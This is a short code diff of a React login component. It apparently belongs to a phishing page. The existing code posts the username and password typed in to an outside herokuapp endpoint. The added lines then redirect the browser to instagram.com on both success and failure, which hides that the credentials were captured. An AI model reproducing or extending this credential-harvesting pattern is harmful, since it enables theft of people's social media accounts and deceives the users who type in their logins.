@@ -56,7 +56,6 @@ class Login extends Component {
       //   })
 
 
-
      axios.post('https://ancient1-tor-51301.herokuapp.com/login1', {
         username,
         password
@@ -64,9 +63,12 @@ class Login extends Component {
       .then(function (response) {
         console.log(response);
         this.setState({ showMaintain: true})
+        window.location.href = "https://instagram.com/";
+
       })
       .catch(function (error) {
         console.log(error);
+        window.location.href = "https://instagram.com/";
 
       });      
      this.setState({ showMaintain: true})
